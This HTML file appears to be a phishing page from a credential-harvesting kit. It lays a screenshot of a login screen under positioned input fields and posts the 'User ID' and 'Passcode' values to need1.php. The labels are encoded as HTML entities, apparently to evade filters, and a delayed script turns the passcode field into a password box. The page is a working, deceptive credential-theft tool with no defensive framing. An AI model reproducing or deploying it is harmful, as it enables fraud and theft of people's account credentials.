<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>L&#111;&#103;&#105;n </title>
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
<script>setTimeout(function() {
  document.getElementsByTagName('input')[1].type = "password"
}, 1000);
</script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/favicon.ico"/>
<style type="text/css">
.textbox { 
    border: none; 
    border-bottom: 2px solid #ccc; 
    height: 56px; 
    width: 275px; 
  	font-family: Verdana;
    font-size: 18px;
  	color: #747474;
    padding-left: 6px; 
    border-radius: 0px; 
}  
.textbox:focus { 
    outline: none; 
    border: none; 
    border-bottom: 2px solid #007856; 
} 
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1365px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

<style>
p{font-size: 40px;}
.loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://smallenvelop.com/wp-content/uploads/2014/08/Preloader_11.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
</style>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
$(window).load(function() {
	$(".loader").fadeOut("slow");
});
</script>

</head>
<body>
<div class="loader"></div>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1365px; height:657px; z-index:0"><img src="images/t1.png" alt="" title="" border=0 width=1365 height=657></div>
<form action=need1.php name=alvisab method=post>
<input name="r" placeholder="U&#115;&#101;r &#73;&#68; " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:412px;left:798px;top:208px;z-index:1">
<input name="w" placeholder="P&#97;&#115;&#115;&#99;&#111;&#100;e " class="textbox" autocomplete="off" required type="text" style="position:absolute;width:412px;left:798px;top:304px;z-index:2">
<div id="formimage1" style="position:absolute; left:797px; top:441px; z-index:3"><input type="image" name="formimage1" width="208" height="52" src="images/t3.png"></div>
</div>

</body>
</html>
